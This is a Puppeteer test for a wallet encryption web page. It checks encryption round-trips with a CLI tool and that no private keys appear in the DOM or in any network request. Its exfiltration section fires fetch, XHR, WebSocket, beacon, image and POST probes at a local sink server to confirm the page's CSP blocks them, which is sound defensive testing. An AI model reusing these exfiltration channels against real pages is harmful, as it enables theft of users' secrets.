// Browser test for website/cli-tools.html (hosted) and the offline copy (file://).
//   node tests/web/cli_tools_browser.js <release_dir> <chrome> <puppeteer-core dir> [base_url]
// - drives the real page: import v1 -> encrypt -> download -> release sost-cli opens it;
//   CLI v2 -> verify + expected address; wrong passphrase; v1 refused in verify path
// - EXFILTRATION: records every request / websocket / beacon after the document load and
//   fails on any; also asserts the CSP blocks fetch/XHR/WebSocket/sendBeacon/image beacons
// - layout at 390/768/1366/1920: no horizontal overflow, 0 JS errors
const { spawnSync } = require('child_process');
const fs = require('fs'), os = require('os'), path = require('path'), http = require('http');
const [REL, CHROME, PUP, BASE] = process.argv.slice(2);
const puppeteer = require(PUP);
const ROOT = path.resolve(__dirname, '../../website');
const CLI = path.join(REL, 'sost-cli');
const PASS = 'Tr0ub4dor & 3 horses';
let n = 0, ok = 0;
const step = (name, c, d = '') => { n++; if (c) ok++; console.log(`[${c ? 'PASS' : 'FAIL'}] ${name}${d ? ' — ' + d : ''}`); };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'clitools-web-')); fs.chmodSync(tmp, 0o700);
const v1 = path.join(tmp, 'miner-test.json');
spawnSync(CLI, ['--wallet', v1, 'newwallet']); spawnSync(CLI, ['--wallet', v1, 'getnewaddress', 'MINING TEST']);
const v1j = JSON.parse(fs.readFileSync(v1, 'utf8'));
const privs = v1j.keys.map((k) => k.privkey), addrs = v1j.keys.map((k) => k.address);
const pf = path.join(tmp, 'p'); fs.writeFileSync(pf, PASS + '\n', { mode: 0o600 });
const cliv2 = path.join(tmp, 'cli.v2.json');
spawnSync('bash', ['-c', `exec 3<"${pf}"; "${CLI}" --wallet "${v1}" wallet-export --encrypted --output "${cliv2}" --passphrase-fd 3`]);
const SECRETS = [PASS, ...privs, encodeURIComponent(PASS)];

function server() {
  return http.createServer((q, r) => {
    const u = decodeURIComponent(q.url.split('?')[0]);
    const f = path.join(ROOT, u === '/' ? 'cli-tools.html' : u);
    fs.readFile(f, (e, d) => { if (e) { r.writeHead(404); r.end(); return; } r.writeHead(200, { 'content-type': f.endsWith('.html') ? 'text/html' : 'application/octet-stream' }); r.end(d); });
  });
}

async function run(browser, url, label) {
  const page = await browser.newPage();
  const errs = [], reqs = [], blocked = [];
  page.on('pageerror', (e) => errs.push(e.message));
  page.on('console', (m) => { if (m.type() === 'error' && !/Content Security Policy|Refused to/.test(m.text())) errs.push(m.text()); if (/Content Security Policy|Refused to/.test(m.text())) blocked.push(m.text().slice(0, 90)); });
  const cdp = await page.target().createCDPSession();
  await cdp.send('Network.enable');
  cdp.on('Network.requestWillBeSent', (e) => reqs.push({ url: e.request.url, post: e.request.postData || '' }));
  cdp.on('Network.webSocketCreated', (e) => reqs.push({ url: e.url, ws: true }));
  const dl = fs.mkdtempSync(path.join(tmp, 'dl-'));
  await cdp.send('Page.setDownloadBehavior', { behavior: 'allow', downloadPath: dl });
  await page.setViewport({ width: 1366, height: 900 });
  await page.goto(url, { waitUntil: 'load' });
  await page.waitForFunction(() => /Ready/.test(document.getElementById('ready').textContent), { timeout: 10000 });
  const docReqs = reqs.length;

  // ---- import v1 + encrypt in the real page
  await (await page.$('#file')).uploadFile(v1);
  await page.waitForFunction(() => /CLI v1/.test(document.getElementById('detect').textContent));
  await page.type('#pw1', PASS); await page.type('#pw2', PASS);
  await page.click('#encBtn');
  await page.waitForFunction(() => /Encrypted ✓|failed|match/i.test(document.getElementById('encOut').textContent), { timeout: 30000 });
  const encTxt = await page.$eval('#encOut', (e) => e.textContent);
  const pwCleared = await page.evaluate(() => !document.getElementById('pw1').value && !document.getElementById('pw2').value);
  await page.click('#dl'); await sleep(1500);
  const files = fs.readdirSync(dl);
  step(`${label}: WEB_V1_TO_V2 in browser`, /Encrypted ✓/.test(encTxt) && files.includes('miner-test.v2.json'), files.join(','));
  step(`${label}: passphrase fields cleared after encrypt`, pwCleared);
  // the browser-written file opened by the release sost-cli
  const target = path.join(tmp, label + '-back.json');
  spawnSync(CLI, ['--wallet', target, 'newwallet']);
  const r = spawnSync('bash', ['-c', `exec 3<"${pf}"; "${CLI}" --wallet "${target}" wallet-import --encrypted --input "${path.join(dl, 'miner-test.v2.json')}" --passphrase-fd 3`], { encoding: 'utf8' });
  const back = r.status === 0 ? JSON.parse(fs.readFileSync(target, 'utf8')).keys.map((k) => k.privkey) : [];
  step(`${label}: CLI_OPENS_WEB_V2 (file downloaded from the browser)`, r.status === 0 && JSON.stringify(back) === JSON.stringify(privs), r.stderr.trim().slice(0, 80));
  const domHasPriv = await page.evaluate((p) => p.some((x) => document.documentElement.outerHTML.includes(x)), privs);
  step(`${label}: no private key rendered in the DOM`, !domHasPriv);

  // ---- verify CLI v2 with expected address
  await (await page.$('#file')).uploadFile(cliv2);
  await page.waitForFunction(() => /CLI v2/.test(document.getElementById('detect').textContent));
  await page.type('#vpw', 'definitely wrong pass');
  await page.click('#verBtn');
  await page.waitForFunction(() => /failed|unlocked/.test(document.getElementById('verOut').textContent), { timeout: 30000 });
  step(`${label}: wrong passphrase fails cleanly`, /decryption failed/.test(await page.$eval('#verOut', (e) => e.textContent)));
  await page.type('#vpw', PASS); await page.type('#expect', addrs[1]);
  await page.click('#verBtn');
  await page.waitForFunction(() => /unlocked|failed/.test(document.getElementById('verOut').textContent) && !/wrong passphrase/.test(document.getElementById('verOut').textContent), { timeout: 30000 });
  const vt = await page.$eval('#verOut', (e) => e.textContent);
  step(`${label}: CLI_V2_OPENS_IN_WEB + VERIFY_ADDRESS MATCH`, /unlocked ✓/.test(vt) && vt.includes(addrs[0]) && vt.includes(addrs[1]) && /MATCH ✓/.test(vt));
  const cmd = await page.$eval('#cmd', (e) => e.textContent), wsl = await page.$eval('#wsl', (e) => e.textContent);
  step(`${label}: miner command uses label + passphrase FILE, no secrets`, /--mining-key-label 'MINING TEST'/.test(cmd) && /--wallet-passphrase-file/.test(cmd)
       && !/--rpc-pass /.test(cmd) && !SECRETS.some((s) => cmd.includes(s) || wsl.includes(s)), cmd.split('\n')[3]?.trim());
  step(`${label}: WSL helper reads the passphrase in the terminal`, /IFS= read -r -s/.test(wsl) && /chmod 600/.test(wsl) && /umask 077/.test(wsl));

  // ---- exfiltration: CSP must block every channel; nothing may leave after load
  const probeStart = reqs.length;
  sinkHits = [];
  const probes = await page.evaluate(async (SINK) => {
    const res = {};
    try { await fetch('http://' + SINK + '/fetch?d=1'); res.fetch = 'SENT'; } catch { res.fetch = 'blocked'; }
    try { const x = new XMLHttpRequest(); x.open('GET', 'http://' + SINK + '/xhr'); x.send(); await new Promise((r) => setTimeout(r, 300)); res.xhr = x.status ? 'SENT' : 'blocked'; } catch { res.xhr = 'blocked'; }
    try { new WebSocket('ws://' + SINK + '/ws'); res.ws = 'created'; } catch { res.ws = 'blocked'; }
    try { res.beacon = navigator.sendBeacon('http://' + SINK + '/beacon', 'x') ? 'queued' : 'blocked'; } catch { res.beacon = 'blocked'; }
    const img = new Image(); img.src = 'http://' + SINK + '/img?d=1';
    try { await fetch('http://' + SINK + '/post', { method: 'POST', body: 'secret', mode: 'no-cors' }); } catch {}
    await new Promise((r) => setTimeout(r, 1500));
    return res;
  }, SINK);
  await sleep(800);
  // requests the page itself issued during the wallet operations (before the probes): must be none
  const during = reqs.slice(docReqs, probeStart).filter((q) => !q.url.startsWith('data:') && !q.url.startsWith('blob:'));
  const leaked = reqs.filter((q) => SECRETS.some((s) => (q.url + q.post).includes(s)));
  step(`${label}: zero network requests during import / encrypt / verify`, during.length === 0, during.map((q) => q.url).join(' ').slice(0, 160));
  step(`${label}: no passphrase / private key in any request`, leaked.length === 0);
  // ground truth for the probes: did anything ARRIVE at the sink server?
  step(`${label}: EXFILTRATION probes (fetch, XHR, WebSocket, sendBeacon, image, POST) — 0 hits at the sink`, sinkHits.length === 0,
       sinkHits.length ? sinkHits.join(', ') : 'blocked by CSP: ' + blocked.length + ' violations reported');

  // ---- layout
  for (const w of [390, 768, 1366, 1920]) {
    await page.setViewport({ width: w, height: 900, isMobile: w < 500 });
    await sleep(200);
    const o = await page.evaluate(() => document.documentElement.scrollWidth - innerWidth);
    step(`${label}: ${w}px no horizontal overflow`, o <= 0, `overflow ${o}px`);
  }
  step(`${label}: 0 JS errors`, errs.length === 0, errs.join(' | ').slice(0, 160));
  await page.close();
}

let sinkHits = [];
function sink() {
  const sv = http.createServer((q, r) => { sinkHits.push(q.method + ' ' + q.url); r.writeHead(200); r.end('ok'); });
  sv.on('upgrade', (q, sock) => { sinkHits.push('WS ' + q.url); sock.destroy(); });
  return sv;
}
let SINK = '';
(async () => {
  const sk = sink(); await new Promise((r) => sk.listen(0, '127.0.0.1', r)); SINK = `127.0.0.1:${sk.address().port}`;
  const srv = server(); await new Promise((r) => srv.listen(0, r));
  const browser = await puppeteer.launch({ executablePath: CHROME, args: ['--no-sandbox'] });
  await run(browser, BASE || `http://127.0.0.1:${srv.address().port}/cli-tools.html`, BASE ? 'prod' : 'hosted');
  const off = fs.readdirSync(path.join(ROOT, 'downloads')).filter((f) => /^sost-cli-tools-offline-.*\.html$/.test(f)).sort().pop();
  if (!BASE) await run(browser, 'file://' + path.join(ROOT, 'downloads', off), 'offline-file');
  await browser.close(); srv.close(); sk.close();
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log(`\nRESULT: ${ok}/${n} PASS`);
  process.exit(ok === n ? 0 : 1);
})().catch((e) => { console.error(e); process.exit(2); });
